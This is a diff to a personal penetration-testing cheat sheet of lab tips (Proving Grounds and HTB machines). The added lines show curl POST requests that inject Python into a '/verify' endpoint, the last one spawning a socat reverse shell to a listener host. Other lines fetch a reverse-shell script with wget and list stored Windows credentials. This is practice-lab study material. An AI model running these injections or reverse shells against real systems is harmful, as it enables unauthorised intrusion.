@@ -1,5 +1,6 @@
 # FEEL LIKE STUCK???
 - Did we run cmdkey /list?
+- Did we try running POST request on found url???(ex hetemit)
 - Did we try wget without http:? so "wget 192.168.45.176:443/revlin.sh"
 - Did we check all the files inside of .config??
 - Did we try checking "EVERYTHING" inside of user's folder?(ex. .bash_aliases, .bash_history..)
@@ -63,7 +64,10 @@
     - cd /root
     - cat /root/proof
 - Fuguhub 8.4 exploit(PG-Prac Hub)
-
+- POST request on url(PG-Prac Hetemit) : https://al1z4deh.medium.com/proving-grounds-hetemit-8469d0a3f189
+    - curl -X POST http://192.168.250.117:50000/verify — data “code=2*2”
+    - curl -X POST http://192.168.250.117:50000/verify — data “code=os” # This way we will know what we get back.. 
+    - curl -X POST http://192.168.250.117:50000/verify --data "code=os.system('socat TCP:192.168.49.250:80 EXEC:sh')"
 - PDFkit(PG-Prac RubyDome): https://github.com/UNICORDev/exploit-CVE-2022-25765
 - LFI with zip filter(PG-Prac Zipper)
 - Jenkins(HTB Jeeves)
